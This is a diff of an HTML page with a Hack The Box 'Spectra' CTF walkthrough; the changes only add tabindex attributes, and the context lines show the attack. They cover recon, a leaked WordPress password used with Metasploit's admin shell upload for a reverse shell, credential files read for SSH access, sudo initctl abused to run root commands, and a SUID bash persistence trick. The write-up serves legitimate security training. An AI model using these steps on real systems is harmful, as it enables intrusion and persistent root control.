@@ -207,7 +207,7 @@ step by step solution.</p>
 <h2 id="initial-recon">Initial Recon<a href="#initial-recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Before we start, let&rsquo;s pop <code>10.10.10.229</code> as the <code>spectra.htb</code> entry in our hosts file and get an
 <code>nmap</code> scan going.</p>
-<pre><code>$ nmap -A -T4 -p- spectra.htb
+<pre tabindex="0"><code>$ nmap -A -T4 -p- spectra.htb
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-08 14:38 EDT
 Nmap scan report for spectra.htb (10.10.10.229)
 Host is up (0.030s latency).
@@ -268,7 +268,7 @@ a list of endpoints &ndash; the concept is similar to a worldlist used for passw
 wordlists can be found <a href="https://github.com/daviddias/node-dirbuster/tree/master/lists">here</a>.
 Longer lists will naturally take more time to go through but will have more thorough results.</p>
 <p>Armed with a target and a wordlist, let&rsquo;s give Gobuster a spin.</p>
-<pre><code>$ gobuster -u http://spectra.htb/ -w ../../tools/http-enum/common.txt
+<pre tabindex="0"><code>$ gobuster -u http://spectra.htb/ -w ../../tools/http-enum/common.txt
 
 =====================================================
 Gobuster v2.0.1              OJ Reeves (@TheColonial)
@@ -314,7 +314,7 @@ a look.</p>
 <p><img src="/img/htb-spectra/enum-wp-config-php-save.png" alt=""></p>
 <p>Bingo, it indeed contains PHP code and along with the code, we have found credentials to the
 database.</p>
-<pre><code>// ** MySQL settings - You can get this info from your web host ** //
+<pre tabindex="0"><code>// ** MySQL settings - You can get this info from your web host ** //
 /** The name of the database for WordPress */
 define( 'DB_NAME', 'dev' );
 
@@ -388,7 +388,7 @@ are mainly here to learn.</p>
 <p>Without further due, let&rsquo;s fire up Metasploit. We will be using the
 <code>exploit/unix/webapp/wp_admin_shell_upload</code> so let&rsquo;s see how to set it up and get it ready for
 exploitation.</p>
-<pre><code>       =[ metasploit v6.0.37-dev                          ]
+<pre tabindex="0"><code>       =[ metasploit v6.0.37-dev                          ]
 + -- --=[ 2111 exploits - 1136 auxiliary - 357 post       ]
 + -- --=[ 592 payloads - 45 encoders - 10 nops            ]
 + -- --=[ 8 evasion                                       ]
@@ -401,7 +401,7 @@ msf6 &gt; use exploit/unix/webapp/wp_admin_shell_upload
 </code></pre><p>As simple as that, all we have to do is launch Metasploit with <code>msfconsole</code> and type in <code>use</code>
 followed by the the module we want to load. The <code>options</code> command, when a module is selected, will
 display the configurable options as shown bellow.</p>
-<pre><code>msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; options
+<pre tabindex="0"><code>msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; options
 
 Module options (exploit/unix/webapp/wp_admin_shell_upload):
 
@@ -438,7 +438,7 @@ embed a PHP reverse shell payload in it, and upload it to a running WordPress se
 the provided administrator account username and password.</p>
 <p>You can see the required fields from the listing above with their description on what a specific
 parameter does. Let&rsquo;s go ahead and configure the module for our specific use case.</p>
-<pre><code>msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set PASSWORD devteam01
+<pre tabindex="0"><code>msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set PASSWORD devteam01
 PASSWORD =&gt; devteam01
 msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set RHOSTS 10.10.10.229
 RHOSTS =&gt; 10.10.10.229
@@ -454,7 +454,7 @@ just need to make sure it&rsquo;s not being blocked by any firewall or used by a
 An other note, <code>TARGETURI</code> was required to set in our case because we are not using the default <code>/</code>
 setting. Our WordPress portal is at <code>http://spectra.htb/main</code>, <strong>NOT</strong> <code>http://spectra.htb/</code>. Not
 setting this will result in the exploit failing:</p>
-<pre><code>msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; exploit
+<pre tabindex="0"><code>msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; exploit
 
 [*] Started reverse TCP handler on 10.10.14.85:4444
 [-] Exploit aborted due to failure: not-found: The target does not appear to be using WordPress
@@ -462,7 +462,7 @@ setting this will result in the exploit failing:</p>
 </code></pre><p>Setting the <code>TARGETURI</code> to <code>/main</code>, as stated above, will fix target WordPress and drop us in a
 <a href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/">Meterpreter</a> shell (see
 it as a shell on steroids).</p>
-<pre><code>msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set TARGETURI /main
+<pre tabindex="0"><code>msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set TARGETURI /main
 TARGETURI =&gt; /main
 
 msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; exploit
@@ -487,7 +487,7 @@ sh: 0: getcwd() failed: No such file or directory
 </code></pre><p>Once the Meterpreter session is open, we can use the <code>shell</code> command to drop to an <code>sh</code> shell. It is
 pretty limited (no echo, no prompt) so we can upgrade it to an interactive shell using the following
 python command</p>
-<pre><code>python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+<pre tabindex="0"><code>python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;
 </code></pre><p>The <code>pty</code> package stands for &ldquo;Pseudo-Terminal Utilities&rdquo; and <code>spawn</code> simply spawns a new process,
 <code>/bin/bash</code> in our case. The full documentation is available
 <a href="https://docs.python.org/3/library/pty.html#pty.spawn">here</a>.</p>
@@ -503,7 +503,7 @@ of privilege escalation, and going after the &ldquo;user&rdquo; account and get 
 quick scan of the <code>/etc/passwd</code> file. It is world readable and contains information on the users but
 no password hashes. Those can be found in the <code>/etc/shadow</code> file but only <code>root</code> has read access to
 it under normal circumstances.</p>
-<pre><code>nginx@spectra / $ cat /etc/passwd
+<pre tabindex="0"><code>nginx@spectra / $ cat /etc/passwd
 messagebus:!:201:201:dbus-daemon:/dev/null:/bin/false
 chunneld:!:20141:20141:Daemon for tunneling localhost to containers:/dev/null:/bin/false
 root:x:0:0:root:/root:/bin/bash
@@ -527,7 +527,7 @@ for clues and information.</p>
 <code>/etc</code>, <code>/opt</code>, <code>/var/log</code>, and <code>/tmp</code>.</p>
 <p>Going through <code>/opt</code> we stumble upon the <code>autologin.conf.orig</code> file. This seems like a configuration
 file that was backed up for some reason. In any case, we can look through its contents.</p>
-<pre><code>nginx@spectra /opt $ cat auto
+<pre tabindex="0"><code>nginx@spectra /opt $ cat auto
 cat autologin.conf.orig
 # Copyright 2016 The Chromium OS Authors. All rights reserved.
 # Use of this source code is governed by a BSD-style license that can be
@@ -563,7 +563,7 @@ Chromebook is running this? Interesting&hellip;</p>
 <p>Anyway, back to the file. It&rsquo;s time for us to read some code &ndash; this seems to be used for an auto
 login feature and you can configure this by providing a password in the <code>/etc/autologin/passwd</code> file
 . Let&rsquo;s see if such a file exists and dump its contents if it does.</p>
-<pre><code>nginx@spectra /opt $ cat /etc/autologin/passwd
+<pre tabindex="0"><code>nginx@spectra /opt $ cat /etc/autologin/passwd
 SummerHereWeCome!!
 
 </code></pre><p>Someone&rsquo;s excited for summer! It&rsquo;s hard to confirm if its <code>katie</code>&rsquo;s password or the password of an
@@ -571,18 +571,18 @@ other user since the autologin feature doesn&rsquo;t seem to distinguish users o
 the only way to find out is to try it out.</p>
 <p>From the <a href="#initial-recon">Initial Recon</a> section, we can recall that port <code>22</code> (SSH) is open. We can
 give this a shot and provide this password for the <code>katie</code> user.</p>
-<pre><code>$ ssh katie@10.10.10.229
+<pre tabindex="0"><code>$ ssh katie@10.10.10.229
 (katie@10.10.10.229) Password: &lt;enter SummerHereWeCome!!&gt;
 
 katie@spectra ~ $ 
 </code></pre><p>Well, what do you know. We were able to login into <code>katie</code>&rsquo;s account using the password we found.</p>
 <p>First things first though. Let&rsquo;s ID the <code>katie</code> user.</p>
-<pre><code>katie@spectra ~ $ id
+<pre tabindex="0"><code>katie@spectra ~ $ id
 uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
 </code></pre><p>She&rsquo;s in the <code>developers</code> group. This might not seem super important now but let&rsquo;s keep this in the
 back of our minds, this extra information can come in handy later if we need it.</p>
 <p>Let&rsquo;s see if we can access the <code>user.txt</code> file and extract the user flag from it.</p>
-<pre><code>katie@spectra ~ $ cat user.txt
+<pre tabindex="0"><code>katie@spectra ~ $ cat user.txt
 e89d27fe195e9114ffa72ba8913a6130
 </code></pre><p>Alright, awesome we got the user flag! Let&rsquo;s take a breather and recap what just happened here. We
 were able to escalate out of the limited <code>nginx</code> user without much technical proesse. We stumbled
@@ -604,7 +604,7 @@ elevated privileges. The <a href="https://wiki.archlinux.org/title/sudo">Arch Wi
 information about how <code>sudo</code> works and how to configure it on a Linux (or similar) system.</p>
 <p>To list the <code>sudo</code> list for our current user, all we have to do is run the <code>sudo -l</code> command and
 look at its output.</p>
-<pre><code>katie@spectra ~ $ sudo -l
+<pre tabindex="0"><code>katie@spectra ~ $ sudo -l
 User katie may run the following commands on spectra:
     (ALL) SETENV: NOPASSWD: /sbin/initctl
 </code></pre><p>So it seems that we can execute, with <code>sudo</code>, the <code>/sbin/initctl</code> command. The <code>NOPASSSWD</code> option
@@ -615,7 +615,7 @@ daemon. From the <a href="http://upstart.ubuntu.com/getting-started.html">Ubunto
 extract that configured jobs are, by default, installed in <code>/etc/init</code> directory. We can list them
 with <code>sudo initctl list</code> and we can run them with <code>sudo /sbin/initctl start &lt;job name&gt;</code>.</p>
 <p>Let&rsquo;s list what jobs are currently running.</p>
-<pre><code>katie@spectra ~ $ sudo /sbin/initctl list
+<pre tabindex="0"><code>katie@spectra ~ $ sudo /sbin/initctl list
 crash-reporter-early-init stop/waiting
 cups-clear-state stop/waiting
 ...
@@ -638,13 +638,13 @@ through all the steps listed above. This is how threat actors operate too.</p>
 through <code>sudo /sbin/initctl</code>, is running with root privileges. It will have the required access to
 read the <code>root.txt</code> file, something our <code>katie</code> user doesn&rsquo;t have.</p>
 <p>Here is what we&rsquo;ll be replacing the script in <code>test.conf</code> with:</p>
-<pre><code>   cat /root/root.txt &gt;&gt; /home/katie/flag.txt
+<pre tabindex="0"><code>   cat /root/root.txt &gt;&gt; /home/katie/flag.txt
    chmod 777 /home/katie/flag.txt
 </code></pre><p>We&rsquo;re simply catting the contents of the <code>root.txt</code> to a file in <code>katie</code>&rsquo;s home directory and then
 making that new file world readable. The second part is necessary because we want to make sure our
 new file, which will be owned by <code>root</code>, is world readable so that <code>katie</code> can access it. Here&rsquo;s
 what our <code>test.conf</code> should look like:</p>
-<pre><code>katie@spectra /etc/init $ cat test.conf
+<pre tabindex="0"><code>katie@spectra /etc/init $ cat test.conf
 description &quot;Test node.js server&quot;
 author      &quot;katie&quot;
 
@@ -667,7 +667,7 @@ pre-stop script
 end script
 
 </code></pre><p>The only thing left to do now is run the test job and reap the fruit of our efforts.</p>
-<pre><code>katie@spectra /etc/init $ sudo /sbin/initctl start test
+<pre tabindex="0"><code>katie@spectra /etc/init $ sudo /sbin/initctl start test
 test start/running, process 9474
 
 katie@spectra /etc/init $ cat /home/katie/flag.txt
@@ -678,7 +678,7 @@ how we can achieve that in the next section.</p>
 <h3 id="persistent-solution">Persistent Solution<a href="#persistent-solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>The persistent solution is similar to the <a href="#flag-solution">flag solution</a> but we&rsquo;re going to be
 replacing the script with the following command.</p>
-<pre><code>chmod +s /bin/bash
+<pre tabindex="0"><code>chmod +s /bin/bash
 </code></pre><p>What we&rsquo;re actually doing here is setting the &ldquo;s&rdquo; flag on the <code>/bin/bash</code> file. What this does is
 make bash set the user and group IDs to those of the owner of the file when executed. In the case of
 <code>/bin/bash</code>, the user and group are <code>root</code> and <code>root</code>, respectively.</p>
@@ -696,7 +696,7 @@ reset.</p>
 </blockquote>
 <p>What this means is that if we want to successfully inherit the root uid and gid, we will need
 to invoke <code>bash</code> with the <code>-p</code> option.</p>
-<pre><code>katie@spectra /etc/init $ /bin/bash -p
+<pre tabindex="0"><code>katie@spectra /etc/init $ /bin/bash -p
 bash-4.3# whoami
 root
 
